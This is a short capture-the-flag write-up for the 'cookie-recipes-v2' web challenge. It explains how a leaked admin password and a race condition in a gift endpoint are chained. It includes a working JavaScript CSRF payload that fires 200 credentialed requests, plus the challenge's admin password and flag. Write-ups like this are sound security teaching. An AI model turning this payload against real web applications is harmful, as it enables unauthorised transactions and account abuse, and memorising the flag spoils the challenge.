# cookie-recipes-v2

Source: [index.js](./index.js)

The "gift" endpoint is vulnerable to CSRF as long as we have the admin password. We can get this from the `userInfo` endpoint: `https://cookie-recipes-v2.2020.redpwnc.tf/api/userInfo?id=0`. The next step is to figure out how to recieve a gift multiple times, since only 1 gift won't be enough to buy the flag. We can exploit a race condition in the gifting code, as it only sets the recieved status after it gifts us 150 credits. This means that if we spam many gift requests, we can cause the server to gift us multiple times, allowing us to buy the flag.

Final Exploit:

```html
<script>
	for (i = 0; i < 200; i++) {
		var xhr = new XMLHttpRequest();
		xhr.open("POST", "https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=11715887817660277906");
		xhr.withCredentials = true;
		xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		xhr.send('{"username":"admin","password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn"}');
	}
</script>
```

Flag: `flag{n0_m0r3_gu3551ng}`
